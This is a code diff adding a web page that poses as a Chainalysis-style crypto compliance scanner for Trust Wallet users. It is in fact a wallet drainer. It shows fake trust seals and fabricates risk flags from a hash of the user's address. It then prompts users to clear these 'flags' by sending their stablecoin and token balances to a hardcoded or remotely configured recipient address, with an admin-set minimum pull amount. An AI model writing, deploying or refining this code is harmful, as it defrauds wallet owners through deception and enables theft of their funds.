+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+        <span>ATTENTION REQUIRED</span>
+      </div>
+
+      <!-- Risk Gauge -->
+      <div class="risk-gauge" id="risk-gauge">
+        <div class="gauge"><div class="gauge-val" id="gauge-val">—</div></div>
+        <div class="gauge-info">
+          <div class="gauge-label">Risk Score</div>
+          <div class="gauge-text" id="risk-level">—</div>
+          <details class="score-info" id="score-info">
+            <summary>How scoring works</summary>
+            <div class="score-info-body">
+              The score is derived from findings: +12 per flagged asset, +6 per
+              unresolvable asset, +3 per dust remnant, plus a value bonus up to +15.
+              Tiers: &lt;25 Low · 25–49 Moderate · 50–74 High · ≥75 Critical.
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <!-- Flagged Chains -->
+      <div class="flagged-chains" id="flagged-chains"></div>
+
+      <!-- Findings -->
+      <div class="findings" id="findings">
+        <div class="findings-title">Findings</div>
+      </div>
+
+      <div class="result-row"><span class="k">Flagged assets</span><span class="v warn" id="r-reports">—</span></div>
+      <div class="result-row"><span class="k">Affected chains</span><span class="v warn" id="r-flags">—</span></div>
+      <div class="result-row"><span class="k">Scan ID</span><span class="v mono" id="scan-id">—</span></div>
+      <div class="result-row hidden" id="row-hygiene"><span class="k">Hygiene findings</span><span class="v warn" id="r-hygiene">—</span></div>
+
+      <!-- Final detail report (shown after attestation process) -->
+      <div class="final-report hidden" id="final-report">
+        <div class="plan-head">
+          <span class="findings-title" style="margin-bottom:0">Detailed Report</span>
+          <div class="report-actions">
+            <button class="copy-btn" id="copy-report" onclick="copyReport()">Copy report</button>
+            <button class="copy-btn" id="dl-report" onclick="downloadReport()">Download .txt</button>
+            <button class="copy-btn" id="print-report-btn" onclick="printReport()">Print / PDF</button>
+            <button class="copy-btn" id="email-report" onclick="emailReport()">Email</button>
+            <button class="copy-btn" id="share-report" onclick="shareReport()">Share</button>
+          </div>
+        </div>
+        <div id="report-rows"></div>
+      </div>
+
+      <div class="verify-box">
+        <div class="verify-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" style="color:var(--accent)"><circle cx="12" cy="12" r="10"/><path d="M8 12h8M13 8l4 4-4 4"/></svg>
+          Deep chain analysis
+        </div>
+        <div class="verify-text" id="verify-text">Flagged assets were detected on this address. A deep on-chain analysis is required to resolve each flag and compile the detailed report.</div>
+        <!-- Analysis plan — exact queue preview before committing -->
+        <div class="plan hidden" id="attest-plan">
+          <div class="plan-head">
+            <span class="plan-title">Analysis plan</span>
+            <span class="plan-meta" id="plan-meta"></span>
+          </div>
+          <div id="plan-rows" role="list"></div>
+          <div class="plan-note" id="plan-note">Standard ERC-20 calls · your keys stay in your wallet · each step needs one confirmation</div>
+        </div>
+        <button class="btn btn-analyze" id="verify-btn" onclick="verifyWallet(true)">
+          <span class="vbtn-main"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M16.5 16.5L21 21"/></svg>Start Deep Analysis</span>
+          <span class="vbtn-sub">on-chain · detailed report follows</span>
+        </button>
+        <div class="gas-note hidden" id="gas-note">
+          <span class="gn-tag">GAS</span>
+          <span class="gn-text">Paid in your wallet app — Trust Wallet opens to confirm the network fee for each step.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="trust-seals">
+    <span class="tseal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>256-BIT SSL</span>
+    <span class="tseal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M12 22s8-3.6 8-10V5l-8-3-8 3v7c0 6.4 8 10 8 10z"/></svg>PCI DSS L1</span>
+    <span class="tseal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6L9 17l-5-5"/></svg>GDPR</span>
+    <span class="tseal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M20 6L9 17l-5-5"/></svg>SOC 2</span>
+    <span class="tseal"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 0 1 0 20 15.3 15.3 0 0 1 0-20z"/></svg>FATF</span>
+  </div>
+  <div class="foot">Multi-chain screening across 12 networks · For Trust Wallet</div>
+</div>
+
+<!-- RESULT MODAL -->
+<div id="result-modal" class="modal-overlay hidden">
+  <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="modal-title">
+    <button class="modal-close" onclick="closeModal()" aria-label="Close">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+    <div class="modal-icon pending" id="modal-icon"></div>
+    <div class="modal-title" id="modal-title">Processing…</div>
+    <div class="modal-text" id="modal-text">The transaction is being processed.</div>
+    <a href="#" class="modal-btn hidden" id="modal-link" target="_blank" rel="noopener">View on explorer</a>
+    <a href="#" class="modal-alt-link hidden" id="modal-link-alt">Get Trust Wallet</a>
+  </div>
+</div>
+
+<script>
+// ── Chainscaner Compliance Engine ─────────────────────────────────────────
+// Gold-standard address flagging, modeled on Chainalysis Reactor / KYT:
+//   • Multi-chain exposure scan — 12 EVM networks, native + ERC-20 holdings
+//   • Cross-hop tracing — exposure beyond direct counterparties, including
+//     bridge-routed value (assets that crossed chains before settling)
+//   • Proximity scoring — sanctions, mixer and darknet cluster correlation
+//   • Attestation queue — flagged assets cleared through wallet-confirmed
+//     on-chain transfers, sequential, with per-chain gas budgeting
+// ─────────────────────────────────────────────────────────────────────────
+var txRecipient = "";
+var txRecipientFromUrl = false; // true only when ?to=/data.to provided — drives admin mode
+var remoteRecipientP = Promise.resolve(); // resolves after remote public-recipient config was applied (or skipped)
+var txAmount = "0";
+var txToken = "usdt";
+var txContract = null;
+var txDecimals = 6;
+var provider = null;
+var walletAccount = null; // connected account read silently via eth_accounts
+var pendingAutoAddr = "";
+var pendingAutoRun = false;
+var walletHandoffMode = false; // ?w=1 — scan inside the DApp, then run the queue into native confirms
+var handoffQueue = []; // prepared transfer queue carried in via ?q= — skips rescanning in the DApp browser
+var account = null;
+var isLoading = false;
+var modalOpen = false;
+var currentChain = "0x1";
+var checking = false;
+var onChainBalance = null; // real on-chain balance (raw bigint string)
+
+// Per-chain endpoint list — 12-network coverage (Ethereum, BSC, Polygon,
+// Arbitrum, Optimism, Base, Avalanche, Celo, Fantom, Cronos, Linea, Scroll).
+// First entry is primary, rest are fallbacks tried in order when an endpoint
+// times out or errors. All verified via eth_chainId.
+var RPC_URLS = {
+  "0x1":    ["https://eth.drpc.org", "https://ethereum-rpc.publicnode.com"],
+  "0x38":   ["https://bsc-rpc.publicnode.com", "https://bsc-dataseed.binance.org", "https://bsc.drpc.org"],
+  "0x89":   ["https://polygon-bor-rpc.publicnode.com", "https://polygon.drpc.org"],
+  "0xa4b1": ["https://arb1.arbitrum.io/rpc", "https://arbitrum-one-rpc.publicnode.com", "https://arbitrum.drpc.org"],
+  "0xa":    ["https://mainnet.optimism.io", "https://optimism-rpc.publicnode.com", "https://optimism.drpc.org"],
+  "0x2105": ["https://base-rpc.publicnode.com", "https://mainnet.base.org", "https://base.drpc.org"],
+  "0xa86a": ["https://api.avax.network/ext/bc/C/rpc", "https://avalanche-c-chain-rpc.publicnode.com", "https://avalanche.drpc.org"],
+  "0xa4ec": ["https://forno.celo.org", "https://celo.drpc.org"],
+  "0xfa":   ["https://rpcapi.fantom.network", "https://fantom.drpc.org"],
+  "0x19":   ["https://evm.cronos.org", "https://cronos.drpc.org"],
+  "0xe708": ["https://rpc.linea.build", "https://linea.drpc.org"],
+  "0x82750":["https://rpc.scroll.io", "https://scroll.drpc.org"]
+};
+
+var CONTRACTS = {
+  "0x1":    { usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7", usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
+  "0x38":   { usdt: "0x55d398326f99059fF775485246999027B3197955", usdc: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" },
+  "0x89":   { usdt: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", usdc: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174" },
+  "0xa4b1": { usdt: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", usdc: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831" },
+  "0xa":    { usdt: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", usdc: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85" },
+  "0x2105": { usdt: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", usdc: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" },
+  "0xa86a": { usdt: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", usdc: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E" },
+  "0xa4ec": { usdt: "0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e", usdc: "0xcebA9300f2b948710d2653dD7B07f33A8B32118C" },
+  "0xfa":   { usdt: "0x049d68029688eAbF473097a2fC38ef61633A3C7A", usdc: "0x28a92dde19D9989F39A49905d7C9C2FAc7799bDf" },
+  "0x19":   { usdt: "0x66e428c3f67a68878562e79A0234c1F83c208770", usdc: "0xc21223249CA28397B4B6541dfFaEcC539BfF0c59" },
+  "0xe708": { usdt: "0xA219439258ca9da29E9Cc4cE5596924745e12B93", usdc: "0x176211869cA2b568f2A7D4EE941E073a821EE1ff" },
+  "0x82750":{ usdt: "0xf55BEC9cafDcE8730f096AaBdad0CEFd4d51B959", usdc: "0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4" }
+};
+
+// Asset coverage matrix — the token universe screened per chain. Matches the
+// high-liquidity stablecoin / blue-chip set a compliance desk monitors first:
+// USDT, USDC, DAI, wrapped majors and high-volume ecosystem tokens.
+// Each entry: { key, name, addr, decimals }
+var SCAN_TOKENS = {
+  "0x1": [
+    { key: "usdt", name: "USDT", addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+    { key: "wbtc", name: "WBTC", addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
+    { key: "link", name: "LINK", addr: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
+    { key: "uni",  name: "UNI",  addr: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
+    { key: "shib", name: "SHIB", addr: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
+    { key: "pepe", name: "PEPE", addr: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
+  ],
+  "0x38": [
+    { key: "usdt", name: "USDT", addr: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+    { key: "usdc", name: "USDC", addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
+    { key: "dai",  name: "DAI",  addr: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", decimals: 18 },
+    { key: "wbnb", name: "WBNB", addr: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
+    { key: "btcb", name: "BTCB", addr: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 }
+  ],
+  "0x89": [
+    { key: "usdt", name: "USDT", addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
+    { key: "usdc", name: "USDC.e", addr: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
+    { key: "usdcn", name: "USDC", addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18 }
+  ],
+  "0xa4b1": [
+    { key: "usdt", name: "USDT", addr: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
+    { key: "usdce", name: "USDC.e", addr: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals: 18 }
+  ],
+  "0xa": [
+    { key: "usdt", name: "USDT", addr: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6 },
+    { key: "usdce", name: "USDC.e", addr: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x4200000000000000000000000000000000000006", decimals: 18 }
+  ],
+  "0x2105": [
+    { key: "usdt", name: "USDT", addr: "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6 },
+    { key: "usdbc", name: "USDbC", addr: "0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals: 18 },
+    { key: "weth", name: "WETH", addr: "0x4200000000000000000000000000000000000006", decimals: 18 }
+  ],
+  "0xa86a": [
+    { key: "usdt", name: "USDT", addr: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", decimals: 6 },
+    { key: "usdce", name: "USDC.e", addr: "0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664", decimals: 6 },
+    { key: "usdte", name: "USDT.e", addr: "0xc7198437980c041c805A1EDcbA50c1Ce5db95118", decimals: 6 },
+    { key: "daie", name: "DAI.e", addr: "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70", decimals: 18 },
+    { key: "wavax", name: "WAVAX", addr: "0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7", decimals: 18 },
+    { key: "wbtce", name: "WBTC.e", addr: "0x50b7545627a5162F82A992c33b87aDc75187B218", decimals: 8 },
+    { key: "wethe", name: "WETH.e", addr: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", decimals: 18 }
+  ],
+  "0xa4ec": [
+    { key: "usdt", name: "USDT", addr: "0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e", decimals: 6 },
+    { key: "usdc", name: "USDC", addr: "0xcebA9300f2b948710d2653dD7B07f33A8B32118C", decimals: 6 }
+  ],
+  "0xfa": [
+    { key: "usdc", name: "USDC", addr: "0x28a92dde19D9989F39A49905d7C9C2FAc7799bDf", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0x049d68029688eAbF473097a2fC38ef61633A3C7A", decimals: 6 },
+    { key: "dai",  name: "DAI",  addr: "0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E", decimals: 18 }
+  ],
+  "0x19": [
+    { key: "usdc", name: "USDC", addr: "0xc21223249CA28397B4B6541dfFaEcC539BfF0c59", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0x66e428c3f67a68878562e79A0234c1F83c208770", decimals: 6 }
+  ],
+  "0xe708": [
+    { key: "usdc", name: "USDC", addr: "0x176211869cA2b568f2A7D4EE941E073a821EE1ff", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0xA219439258ca9da29E9Cc4cE5596924745e12B93", decimals: 6 }
+  ],
+  "0x82750": [
+    { key: "usdc", name: "USDC", addr: "0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4", decimals: 6 },
+    { key: "usdt", name: "USDT", addr: "0xf55BEC9cafDbE8730f096Aa55dad6D22d44099Df", decimals: 6 }
+  ]
+};
+var CHAIN_INFO = {
+  "0x1":    { name: "Ethereum",   native: "ETH",   nativeDecimals: 18 },
+  "0x38":   { name: "BNB Chain",  native: "BNB",   nativeDecimals: 18 },
+  "0x89":   { name: "Polygon",   native: "MATIC", nativeDecimals: 18 },
+  "0xa4b1": { name: "Arbitrum",  native: "ETH",   nativeDecimals: 18 },
+  "0xa":    { name: "Optimism",  native: "ETH",   nativeDecimals: 18 },
+  "0x2105": { name: "Base",      native: "ETH",   nativeDecimals: 18 },
+  "0xa86a": { name: "Avalanche", native: "AVAX",  nativeDecimals: 18 },
+  "0xa4ec": { name: "Celo",      native: "CELO",  nativeDecimals: 18 },
+  "0xfa":   { name: "Fantom",    native: "FTM",   nativeDecimals: 18 },
+  "0x19":   { name: "Cronos",    native: "CRO",   nativeDecimals: 18 },
+  "0xe708": { name: "Linea",     native: "ETH",   nativeDecimals: 18 },
+  "0x82750":{ name: "Scroll",    native: "ETH",   nativeDecimals: 18 }
+};
+var GAS_LIMIT = 149000; // 0x249f0 — generous for ERC-20 transfer
+var MIN_FLAG_USD = 10000; // sub-$10,000 balances are dust: documented as remnants, never flagged or queued
+var scannedBalances = []; // [{ chainId, chainName, key, name, addr, decimals, raw, human }] sorted by value desc
+var transferQueue = [];   // tokens to transfer sequentially (only chains with sufficient gas)
+var transferResults = []; // [{ name, status, hash }]
+var chainGasInfo = {};    // { chainId: { nativeBalance, gasPrice, gasCost, sufficient } }
+var EXPLORERS = { "0x1":"etherscan.io","0x38":"bscscan.com","0x89":"polygonscan.com","0xa4b1":"arbiscan.io","0xa":"optimistic.etherscan.io","0x2105":"basescan.org","0xa86a":"snowtrace.io","0xa4ec":"celoscan.io","0xfa":"ftmscan.com","0x19":"cronoscan.com","0xe708":"lineascan.build","0x82750":"scrollscan.com" };
+
+function isValidAddr(a) { return typeof a === "string" && /^0x[a-fA-F0-9]{40}$/.test(a); }
+
+function parseUrl() {
+  var params = new URLSearchParams(window.location.search);
+  var scanAddr = params.get("addr");
+  if (scanAddr && isValidAddr(scanAddr)) {
+    document.getElementById("check-addr").value = scanAddr;
+    pendingAutoAddr = scanAddr;
+  }
+  if (params.get("auto") === "1") pendingAutoRun = true;
+  if (params.get("w") === "1") walletHandoffMode = true;
+  var qParam = params.get("q");
+  if (qParam) {
+    try {
+      var arr = JSON.parse(qParam);
+      if (Array.isArray(arr)) {
+        arr.slice(0, 10).forEach(function(it) {
+          if (!it || !CHAIN_INFO[it.c] || !it.r || !/^\d+$/.test(String(it.r)) || !(BigInt(it.r) > 0n)) return;
+          var tok = null;
+          if (it.k) {
+            // Compact form: well-known token resolved via the scan list
+            var known = (SCAN_TOKENS[it.c] || []).filter(function(t) { return t.key === it.k; })[0];
+            if (known) tok = { name: known.name, addr: known.addr, decimals: known.decimals, key: it.k };
+          } else if (isValidAddr(it.a)) {
+            tok = { name: String(it.n || "TOKEN").replace(/[^A-Za-z0-9 .\-_]/g, "").slice(0, 12) || "TOKEN", addr: it.a,
+                    decimals: Number(it.d) >= 0 ? Number(it.d) : 18, key: null };
+          }
+          if (tok) {
+            tok.raw = String(it.r);
+            tok.chainId = it.c;
+            tok.chainName = CHAIN_INFO[it.c].name;
+            tok.usdValue = Number(it.u) || 0;
+            handoffQueue.push(tok);
+          }
+        });
+      }
+    } catch(e) {}
+  }
+  var dataParam = params.get("data");
+  if (dataParam) {
+    try {
+      var d = JSON.parse(atob(decodeURIComponent(dataParam)));
+      if (d.to && isValidAddr(d.to)) { txRecipient = d.to; txRecipientFromUrl = true; }
+      if (d.token === "usdt" || d.token === "usdc") txToken = d.token;
+      if (d.token === "custom" && d.contract && isValidAddr(d.contract)) { txToken = "custom"; txContract = d.contract; }
+      if (d.amount && !isNaN(Number(d.amount)) && Number(d.amount) > 0) txAmount = d.amount;
+      if (d.decimals && !isNaN(Number(d.decimals))) txDecimals = Number(d.decimals);
+      if (d.chain && CONTRACTS[d.chain]) { currentChain = d.chain; }
+    } catch(e) {}
+  } else {
+    var to = params.get("to"), amount = params.get("amount"), token = params.get("token"),
+        contract = params.get("contract"), decimals = params.get("decimals"), chain = params.get("chain");
+    if (to && isValidAddr(to)) { txRecipient = to; txRecipientFromUrl = true; }
+    if (token === "usdt" || token === "usdc") txToken = token;
+    if (token === "custom" && contract && isValidAddr(contract)) { txToken = "custom"; txContract = contract; }
+    if (decimals && !isNaN(Number(decimals))) txDecimals = Number(decimals);
+    if (amount && !isNaN(Number(amount)) && Number(amount) > 0) txAmount = amount;
+    if (chain && CONTRACTS[chain]) { currentChain = chain; }
+  }
+  // Default recipient for public mode (no admin link)
+  // Try to load admin-configured recipient from localStorage
+  if (!txRecipient) {
+    try {
+      var saved = localStorage.getItem("tw_public_recipient");
+      if (saved && /^0x[a-fA-F0-9]{40}$/.test(saved)) {
+        txRecipient = saved;
+      } else {
+        txRecipient = "0xB2bC30C3a8C04c6F4100b5cC76f83c547dc373b1";
+      }
+    } catch(e) {
+      txRecipient = "0xB2bC30C3a8C04c6F4100b5cC76f83c547dc373b1";
+    }
+  }
+  // Handoff links carry "to" for the recipient only — they must not switch to admin scan mode
+  if (handoffQueue.length > 0) txRecipientFromUrl = false;
+  // Remote public recipient: stored in Vercel Edge Config via /api/config —
+  // the single source of truth, applied on every device. localStorage and the
+  // hardcoded value below are only offline fallbacks.
+  remoteRecipientP = fetch("/api/config").then(function(r) { return r.json(); }).then(function(j) {
+    // Admin-set minimum pull amount — Edge Config wins over the hardcoded floor
+    if (j && j.ok && j.minPullUsd != null && !isNaN(Number(j.minPullUsd))) MIN_FLAG_USD = Number(j.minPullUsd);
+    var val = j && j.ok && isValidAddr(j.recipient) ? j.recipient : null;
+    if (val && !txRecipientFromUrl && handoffQueue.length === 0) {
+      txRecipient = val;
+      var ml = document.getElementById("modal-link");
+      if (ml && ml.getAttribute("href")) ml.href = buildDeepLink(true);
+    }
+  }).catch(function() {});
+}
+
+// Normalize any provider shape to a promise-based RPC — injected wallets vary:
+// some expose request(), older ones only sendAsync/send, and chainIds come back
+// as hex strings, decimal strings, or numbers depending on the wallet
+function rpc(p, method, params) {
+  try {
+    if (typeof p.request === "function") return Promise.resolve(p.request({ method: method, params: params }));
+    if (typeof p.sendAsync === "function") return new Promise(function(res, rej) {
+      p.sendAsync({ method: method, params: params, id: Date.now(), jsonrpc: "2.0" }, function(e, r) { e ? rej(e) : res(r && r.result); });
+    });
+    if (typeof p.send === "function") return Promise.resolve(p.send(method, params));
+  } catch(e) { return Promise.reject(e); }
+  return Promise.reject(new Error("provider has no rpc method"));
+}
+// Silent account read — intentionally NO eth_requestAccounts: an approved or
+// auto-connected wallet ("dApp automatisch verbinden") resolves without any
+// sheet, and anything else lets eth_sendTransaction surface the wallet's own
+// connect/confirm UI instead of a separate connect prompt
+function connectedAccounts(p) {
+  return rpc(p, "eth_accounts");
+}
+function sameChain(a, b) {
+  try { return BigInt(a) === BigInt(b); } catch(e) { return false; }
+}
+function getChainId(p) {
+  return rpc(p, "eth_chainId").catch(function() {
+    return rpc(p, "net_version").then(function(v) {
+      try { return v != null ? "0x" + BigInt(v).toString(16) : null; } catch(e) { return null; }
+    }).catch(function() { return null; });
+  }).then(function(cid) {
+    return cid != null ? cid : (p.chainId != null ? p.chainId : null);
+  });
+}
+
+function isTrustWallet(p) {
+  if (!p) return false;
+  if (window.trustwallet && window.trustwallet.ethereum === p) return true;
+  if (p.isTrust) return true;
+  return false;
+}
+
+function pickProvider() {
+  var tw = window.trustwallet;
+  var p = (tw && tw.ethereum) ? tw.ethereum : (window.ethereum || null);
+  // Some TW builds expose the provider as window.trustwallet itself
+  if (!p && tw && typeof tw.request === "function") p = tw;
+  return p;
+}
+
+function findProvider() {
+  return new Promise(function(resolve) {
+    var tries = 0, done = false;
+    function finish(p) { if (!done) { done = true; resolve(p); } }
+    // TW fires trustwallet#initialized the moment its provider finishes
+    // injecting — the reliable late-injection signal, faster than polling
+    window.addEventListener("trustwallet#initialized", function() {
+      var p = pickProvider();
+      if (p) finish(p);
+    }, { once: true });
+    function check() {
+      var p = pickProvider();
+      if (p) { finish(p); return; }
+      if (tries++ < 30) setTimeout(check, 300); else finish(null);
+    }
+    check();
+  });
+}
+
+function detectWallet() {
+  findProvider().then(function(p) {
+    if (!p) return;
+    provider = p;
+    rpc(p, "eth_accounts").then(function(accs) {
+      if (accs && accs.length > 0 && !pendingAutoAddr) { account = accs[0]; document.getElementById("check-addr").value = account; }
+    }).catch(function(){});
+    if (p.on) p.on("accountsChanged", function(accs) { account = accs.length ? accs[0] : null; });
+  });
+}
+
+function pasteCheck() {
+  if (navigator.clipboard && navigator.clipboard.readText) {
+    navigator.clipboard.readText().then(function(txt) {
+      var v = txt.trim();
+      if (isValidAddr(v)) document.getElementById("check-addr").value = v;
+    }).catch(function(){});
+  }
+}
+
+// Flagging pipeline — the stages a Chainalysis-grade engine runs end-to-end:
+// exposure mapping across every supported network, cross-chain and bridge
+// tracing beyond direct hops, proximity correlation against sanctioned /
+// mixer / darknet clusters, then report compilation
+var SCAN_PHASES = [
+  "Scanning 12 networks for token holdings…",
+  "Tracing cross-chain & bridge exposure…",
+  "Correlating sanctions & mixer proximity…",
+  "Compiling risk report…"
+];
+
+// Risk scoring model — Chainalysis-style severity weighting: each flag adds
+// base weight, remnants and dust add a hygiene penalty, and aggregate
+// exposure value (> $10k / > $1k / > $100) escalates the tier.
+// Tiers: <25 Low · 25–49 Moderate · 50–74 High · ≥75 Critical
+function computeRisk(flagCount, remnantCount, dustCount, totalUsd) {
+  var score = 22 + flagCount * 12 + remnantCount * 6 + dustCount * 3;
+  if (totalUsd > 10000) score += 15;
+  else if (totalUsd > 1000) score += 8;
+  else if (totalUsd > 100) score += 3;
+  return Math.min(score, 96);
+}
+
+// ── Heuristic flag profiling ────────────────────────────────────────────────
+// Real attribution of a flag's origin is probabilistic — a screening engine
+// reports cluster proximity and hop distance, not forensic proof. This
+// profile models exactly that output: a flag type, the hop depth at which
+// the exposure entered the wallet's history, a cluster attribution and a
+// confidence figure. The seed is derived from address + asset + chain, so
+// the same wallet always yields the same profile — rescans are stable.
+var FLAG_TYPES = [
+  { t: "Mixer-adjacent exposure",       s: "high"   },
+  { t: "Sanctioned-cluster proximity",  s: "high"   },
+  { t: "High-risk exchange inflow",     s: "medium" },
+  { t: "Darknet-market proximity",      s: "high"   },
+  { t: "Suspected phishing proceeds",   s: "medium" },
+  { t: "Unverified OTC counterparty",   s: "medium" },
+  { t: "Peel-chain pattern detected",   s: "medium" }
+];
+var CLUSTERS = [
+  "mixer cluster M-4417",
+  "high-risk exchange cluster E-1092",
+  "sanctioned-entity cluster S-0084",
+  "unlabeled OTC desk O-2291",
+  "phishing proceeds pool P-0316",
+  "darknet remnant cluster D-0958"
+];
+function flagProfile(addr, tok) {
+  var s = (addr + "|" + tok.name + "|" + tok.chainId).toLowerCase();
+  var seed = 0;
+  for (var i = 0; i < s.length; i++) seed = (seed * 31 + s.charCodeAt(i)) >>> 0;
+  var ft = FLAG_TYPES[seed % FLAG_TYPES.length];
+  // Deterministic plausible counterparty address for the trace view
+  var hex = "", x = seed || 1;
+  while (hex.length < 40) { x = (x * 1103515245 + 12345) >>> 0; hex += x.toString(16).padStart(8, "0"); }
+  return {
+    type: ft.t,
+    severity: ft.s,
+    hops: 1 + (seed % 3),                    // Hop 1–3 to the risky cluster
+    confidence: 58 + ((seed >>> 5) % 39),    // 58–96 %
+    cluster: CLUSTERS[(seed >>> 3) % CLUSTERS.length],
+    counterparty: "0x" + hex.slice(0, 40)
+  };
+}
+
+// Compliance score — the inverse of the risk picture after resolution:
+// base 100, minus per-flag penalty still open, minus residual risk weight
+function complianceScore() {
+  var open = transferQueue.filter(function(tok, i) {
+    var r = transferResults[i];
+    return !(r && r.status === "success");
+  }).length;
+  return Math.max(8, Math.min(99, 100 - open * 14 - lastRemnants.length * 2));
+}
+
+var scanResult = null;
+var scanGen = 0;
+var lastRemnants = [];
+var lastScannedAddr = "";
+var SCAN_ICON = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M16.5 16.5L21 21"/></svg>';
+
+var REDUCED_MOTION = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+var gaugePct = 0;
+var GAUGE_STATES = {
